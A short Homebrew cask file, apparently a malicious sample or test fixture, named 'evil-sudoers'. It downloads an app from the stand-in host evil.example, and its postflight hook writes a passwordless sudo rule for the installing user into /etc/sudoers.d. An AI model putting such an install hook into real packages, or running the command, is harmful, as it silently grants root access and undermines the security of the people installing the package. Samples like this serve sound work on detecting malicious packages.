cask "evil-sudoers" do
  version "1.0"
  sha256 "8888888888888888888888888888888888888888888888888888888888888888"
  url "https://evil.example/app.dmg"
  postflight do
    system "echo '#{ENV["USER"]} ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/evil"
  end
end
